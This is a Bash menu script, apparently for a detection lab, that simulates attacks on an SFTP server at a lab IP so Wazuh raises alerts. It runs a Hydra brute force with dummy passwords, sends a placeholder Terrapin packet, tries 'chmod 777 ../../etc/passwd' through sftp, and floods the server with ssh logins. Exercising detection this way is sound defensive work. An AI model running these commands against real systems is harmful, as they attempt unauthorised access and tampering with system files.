#!/bin/bash

VICTIM_IP="192.168.1.21"
TARGET_PORT="22"
TARGET_USER="sftpuser"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}===================================================================${NC}"
echo -e "${CYAN} ИНТЕРАКТИВНЫЙ МЕНЕДЖЕР СИМУЛЯЦИИ УГРОЗ ДЛЯ SFTP (OpenSSH) ${NC}"
echo -e "${CYAN}===================================================================${NC}"
echo -e "Адрес машины-жертвы (SFTP-сервер): ${GREEN}${VICTIM_IP}${NC}"
echo ""
echo "Выберите тип угрозы для воспроизведения на стенде:"
echo "1) Интенсивный брутфорс учетной записи (SSH/SFTP - Hydra)"
echo "2) Тестирование криптостойкости транспортного слоя (Terrapin/MITM Scanner)"
echo "3) Имитация обхода chroot-изоляции (Аномальные вызовы chmod/chown)"
echo "4) Симуляция атаки класса regreSSHion (Вызов массовых ошибок Segfault)"
echo "5) Выход из меню"
echo -e "${CYAN}------------------------------------------------------------------=${NC}"
read -p "Введите номер действия (1-5): " CHOICE

case $CHOICE in
    1)
        echo -e "\n${RED}[!] Запуск атаки Brute-Force на порт SSH/SFTP...${NC}"
        echo "Создание временного словаря паролей..."
        echo -e "wrong_sftp_pass1\nwrong_sftp_pass2\nwrong_sftp_pass3" > /tmp/sftp_pass.txt
        
        hydra -l "$TARGET_USER" -P /tmp/sftp_pass.txt ssh://"$VICTIM_IP" -V -t 4
        
        rm -f /tmp/sftp_pass.txt
        echo -e "\n${GREEN}[+] Симуляция брутфорса завершена. Проверьте auth.log в Wazuh.${NC}"
        ;;
        
    2)
        echo -e "\n${RED}[!] Симуляция анализа уязвимости Terrapin (CVE-2023-48795)...${NC}"
        echo "Запуск скрипта проверки согласования расширений и уязвимых шифров (Chacha20-Poly1305)..."
        
        python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
try:
    s.connect(('$VICTIM_IP', int('$TARGET_PORT')))
    banner = s.recv(1024)
    print(f'${CYAN}[*] Установлено TCP-соединение. Ответ сервера: {banner.decode().strip()}${NC}')

    s.sendall(b'\x00\x00\x00\x1c\x05\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
    print('${GREEN}[+] Пакет симуляции Terrapin Attack отправлен в зашифрованный канал.${NC}')
except Exception as e:
    print(f'${RED}[-] Ошибка подключения: {e}${NC}')
finally:
    s.close()
"
        echo -e "${CYAN}[*] Проверьте Wazuh SCA (Security Configuration Assessment) на наличие уязвимых MAC/Ciphers.${NC}"
        ;;
        
    3)
        echo -e "\n${RED}[!] Имитация обхода chroot-изоляции (CVE-2026-32147)...${NC}"
        echo "Попытка выполнения несанкционированных прикладных запросов chmod/chown"
        echo "через подсистему SFTP для изменения атрибутов системных объектов..."
        
        echo -e "chmod 777 ../../etc/passwd\nchmod 777 uploads\nexit" > /tmp/sftp_cmds.txt
        
        echo -e "${CYAN}[*] Запуск SFTP-сессии для отправки манипуляций...${NC}"
        sftp -b /tmp/sftp_cmds.txt -P "$TARGET_PORT" "$TARGET_USER"@"${VICTIM_IP}" 2>/dev/null
        
        rm -f /tmp/sftp_cmds.txt
        echo -e "\n${GREEN}[+] Инъекция файловых манипуляций завершена.${NC}"
        echo -e "${CYAN}[*] Если на жертве включен аудит системных вызовов (Auditd), Wazuh зафиксирует аномальные syscalls.${NC}"
        ;;
        
    4)
        echo -e "\n${RED}[!] Симуляция атаки класса regreSSHion (CVE-2024-6387)...${NC}"
        echo "Запуск генерации шума и некорректных попыток preauth..."
        for i in {1..15}; do
            ssh -o ConnectTimeout=3 -o BatchMode=yes -o StrictHostKeyChecking=no fake_sftp_user_$i@"$VICTIM_IP" > /dev/null 2>&1 &
        done

        echo -e "${GREEN}[+] 15 фоновых потоков атаки запущены.${NC}"
        echo -e "${CYAN}[*] Проверяйте консоль Wazuh через несколько секунд...${NC}"
        ;;
    5)
        echo -e "\n${GREEN}Выход из менеджера симуляции SFTP.${NC}"
        exit 0
        ;;
        
    *)
        echo -e "\n${RED}[–] Неверный выбор. Укажите число от 1 to 5.${NC}"
        ;;
esac
